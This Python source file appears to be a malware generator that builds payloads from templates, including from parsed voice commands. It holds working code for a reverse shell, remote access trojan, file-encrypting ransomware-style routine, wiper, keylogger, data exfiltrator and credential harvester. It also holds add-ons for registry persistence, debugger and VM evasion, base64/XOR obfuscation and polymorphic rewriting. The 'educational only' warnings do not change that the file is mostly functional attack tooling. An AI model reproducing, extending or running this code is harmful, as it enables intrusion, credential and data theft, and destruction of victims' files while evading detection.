"""
Interactive Malware Builder - Create Malware On The Fly
WARNING: For authorized testing and educational purposes only.
"""
import os
import tempfile
from typing import Dict, List, Optional, Any
from datetime import datetime
import json


class MalwareBuilder:
    """Interactive malware builder for on-the-fly creation"""
    
    def __init__(self):
        self.templates = self._load_templates()
        self.components = self._load_components()
    
    def _load_templates(self) -> Dict:
        """Load malware templates"""
        return {
            'keylogger': self._get_keylogger_template(),
            'reverse_shell': self._get_reverse_shell_template(),
            'file_encryptor': self._get_file_encryptor_template(),
            'network_scanner': self._get_network_scanner_template(),
            'data_exfiltrator': self._get_data_exfiltrator_template(),
            'credential_harvester': self._get_credential_harvester_template(),
            'rat': self._get_rat_template(),
            'cryptominer': self._get_cryptominer_template(),
            'wiper': self._get_wiper_template(),
            'browser_hijacker': self._get_browser_hijacker_template()
        }
    
    def _load_components(self) -> Dict:
        """Load reusable components"""
        return {
            'persistence': self._get_persistence_components(),
            'evasion': self._get_evasion_components(),
            'communication': self._get_communication_components(),
            'encryption': self._get_encryption_components(),
            'stealth': self._get_stealth_components()
        }
    
    def build_custom(self, base_type: str, features: List[str] = None,
                    parameters: Dict = None) -> Dict:
        """Build custom malware with specified features"""
        if base_type not in self.templates:
            raise ValueError(f"Unknown base type: {base_type}")
        
        features = features or []
        parameters = parameters or {}
        
        # Start with base template
        code = self.templates[base_type]
        
        # Apply features
        for feature in features:
            if feature in self.components:
                code = self._inject_component(code, feature, self.components[feature])
            elif feature == 'obfuscation':
                code = self._apply_obfuscation(code)
            elif feature == 'encryption':
                code = self._apply_encryption(code)
            elif feature == 'polymorphic':
                code = self._apply_polymorphic(code)
        
        # Apply parameters
        code = self._apply_parameters(code, parameters)
        
        # Save payload
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"custom_{base_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': base_type,
            'file': filepath,
            'features': features,
            'parameters': parameters,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
    
    def build_from_voice(self, voice_command: str) -> Dict:
        """Build malware from voice command"""
        # Parse voice command
        command_lower = voice_command.lower()
        
        # Extract base type
        base_type = None
        for template_type in self.templates.keys():
            if template_type in command_lower:
                base_type = template_type
                break
        
        if not base_type:
            # Try aliases
            aliases = {
                'keylogger': 'keylogger',
                'kl': 'keylogger',
                'shell': 'reverse_shell',
                'rs': 'reverse_shell',
                'encryptor': 'file_encryptor',
                'scanner': 'network_scanner',
                'harvester': 'credential_harvester',
                'exfiltrator': 'data_exfiltrator'
            }
            for alias, template in aliases.items():
                if alias in command_lower:
                    base_type = template
                    break
        
        if not base_type:
            raise ValueError("Could not determine malware type from command")
        
        # Extract features
        features = []
        if 'obfuscate' in command_lower or 'obfuscated' in command_lower:
            features.append('obfuscation')
        if 'encrypt' in command_lower or 'encrypted' in command_lower:
            features.append('encryption')
        if 'stealth' in command_lower or 'hidden' in command_lower:
            features.append('stealth')
        if 'persist' in command_lower or 'persistence' in command_lower:
            features.append('persistence')
        if 'polymorphic' in command_lower:
            features.append('polymorphic')
        
        # Extract parameters
        parameters = {}
        
        # IP/Port extraction
        import re
        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', voice_command)
        if ip_match:
            parameters['target_ip'] = ip_match.group(1)
        
        port_match = re.search(r'port\s+(\d+)', command_lower)
        if port_match:
            parameters['port'] = int(port_match.group(1))
        
        # Build custom malware
        return self.build_custom(base_type, features, parameters)
    
    def _inject_component(self, code: str, component_type: str, components: Dict) -> str:
        """Inject component into code"""
        if component_type == 'persistence':
            # Add persistence at end
            persistence_code = components.get('registry', '')
            return code + '\n\n' + persistence_code
        elif component_type == 'evasion':
            # Wrap code with evasion
            evasion_wrapper = components.get('wrapper', '')
            return evasion_wrapper.replace('{CODE}', code)
        elif component_type == 'stealth':
            # Add stealth checks
            stealth_check = components.get('vm_check', '')
            return stealth_check + '\n\n' + code
        return code
    
    def _apply_obfuscation(self, code: str) -> str:
        """Apply obfuscation"""
        import base64
        encoded = base64.b64encode(code.encode()).decode()
        return f'''
import base64
exec(base64.b64decode("{encoded}").decode())
'''
    
    def _apply_encryption(self, code: str) -> str:
        """Apply encryption"""
        import base64
        import random
        import string
        
        key = ''.join(random.choices(string.ascii_letters, k=16))
        encrypted = bytearray()
        for i, byte in enumerate(code.encode()):
            encrypted.append(byte ^ ord(key[i % len(key)]))
        
        encoded = base64.b64encode(encrypted).decode()
        return f'''
import base64
key = "{key}"
encrypted = "{encoded}"
decrypted = bytearray()
for i, byte in enumerate(base64.b64decode(encrypted)):
    decrypted.append(byte ^ ord(key[i % len(key)]))
exec(decrypted.decode())
'''
    
    def _apply_polymorphic(self, code: str) -> str:
        """Apply polymorphic transformation"""
        import random
        import string
        
        # Random variable names
        var_map = {}
        for word in ['key', 'data', 'file', 'result', 'value']:
            new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            var_map[word] = new_name
        
        polymorphic = code
        for old, new in var_map.items():
            polymorphic = polymorphic.replace(old, new)
        
        # Add junk code
        junk = f"{''.join(random.choices(string.ascii_lowercase, k=8))} = {random.randint(0, 1000)}"
        lines = polymorphic.split('\n')
        lines.insert(random.randint(0, len(lines)), junk)
        
        return '\n'.join(lines)
    
    def _apply_parameters(self, code: str, parameters: Dict) -> str:
        """Apply parameters to code"""
        for key, value in parameters.items():
            code = code.replace(f'{{{key}}}', str(value))
        return code
    
    # Template getters
    def _get_keylogger_template(self) -> str:
        return '''"""
Educational Keylogger - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import pynput
from pynput import keyboard
import os
import tempfile

log_file = os.path.join(tempfile.gettempdir(), "keylog.txt")

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(str(key) + '\\n')
    except:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    
    def _get_reverse_shell_template(self) -> str:
        return '''"""
Educational Reverse Shell - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import subprocess
import os

HOST = "{target_ip}"
PORT = {port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''
    
    def _get_file_encryptor_template(self) -> str:
        return '''"""
Educational File Encryptor - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

target_dir = "{target_dir}"

for root, dirs, files in os.walk(target_dir):
    for file in files:
        filepath = os.path.join(root, file)
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = cipher.encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted)
        except:
            pass
'''
    
    def _get_network_scanner_template(self) -> str:
        return '''"""
Educational Network Scanner - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import ipaddress

network = "{network}"
ports = [{ports}]

for ip in ipaddress.IPv4Network(network):
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((str(ip), port))
        if result == 0:
            print(f"{{ip}}:{{port}} is open")
        sock.close()
'''
    
    def _get_data_exfiltrator_template(self) -> str:
        return '''"""
Educational Data Exfiltrator - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import requests
import base64

target_dir = "{target_dir}"
exfil_url = "{exfil_url}"

for root, dirs, files in os.walk(target_dir):
    for file in files:
        filepath = os.path.join(root, file)
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encoded = base64.b64encode(data).decode()
            requests.post(exfil_url, json={'file': filepath, 'data': encoded})
        except:
            pass
'''
    
    def _get_credential_harvester_template(self) -> str:
        return '''"""
Educational Credential Harvester - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import keyring
import requests

exfil_url = "{exfil_url}"

# Get saved credentials (example)
try:
    credentials = keyring.get_credential("service", None)
    if credentials:
        requests.post(exfil_url, json={
            'username': credentials.username,
            'password': credentials.password
        })
except:
    pass
'''
    
    def _get_rat_template(self) -> str:
        return '''"""
Educational RAT - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import subprocess
import json

HOST = "{target_ip}"
PORT = {port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode()
    if command == "exit":
        break
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    s.send(json.dumps({'output': result.stdout, 'error': result.stderr}).encode())
'''
    
    def _get_cryptominer_template(self) -> str:
        return '''"""
Educational Cryptominer - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import hashlib
import time

def mine():
    nonce = 0
    while True:
        data = f"block{{nonce}}"
        hash_result = hashlib.sha256(data.encode()).hexdigest()
        if hash_result.startswith("0000"):
            print(f"Found: {{hash_result}}")
            break
        nonce += 1

mine()
'''
    
    def _get_wiper_template(self) -> str:
        return '''"""
Educational Wiper - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import shutil

target_dir = "{target_dir}"

for root, dirs, files in os.walk(target_dir):
    for file in files:
        try:
            os.remove(os.path.join(root, file))
        except:
            pass
    for dir in dirs:
        try:
            shutil.rmtree(os.path.join(root, dir))
        except:
            pass
'''
    
    def _get_browser_hijacker_template(self) -> str:
        return '''"""
Educational Browser Hijacker - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import platform

homepage = "{homepage}"

if platform.system() == "Windows":
    # Modify registry (simplified)
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                       r"Software\\Microsoft\\Internet Explorer\\Main")
    winreg.SetValueEx(key, "Start Page", 0, winreg.REG_SZ, homepage)
'''
    
    # Component getters
    def _get_persistence_components(self) -> Dict:
        return {
            'registry': '''
# Registry persistence
import winreg
winreg.SetValueEx(
    winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    "Update",
    0,
    winreg.REG_SZ,
    __file__
)
'''
        }
    
    def _get_evasion_components(self) -> Dict:
        return {
            'wrapper': '''
# Evasion wrapper
import sys
if sys.gettrace():
    sys.exit(0)
{CODE}
'''
        }
    
    def _get_communication_components(self) -> Dict:
        return {
            'http': 'import requests',
            'socket': 'import socket'
        }
    
    def _get_encryption_components(self) -> Dict:
        return {
            'fernet': 'from cryptography.fernet import Fernet',
            'base64': 'import base64'
        }
    
    def _get_stealth_components(self) -> Dict:
        return {
            'vm_check': '''
# VM detection check
import os
if any(vm in str(os.environ).lower() for vm in ['vmware', 'virtualbox']):
    sys.exit(0)
'''
        }
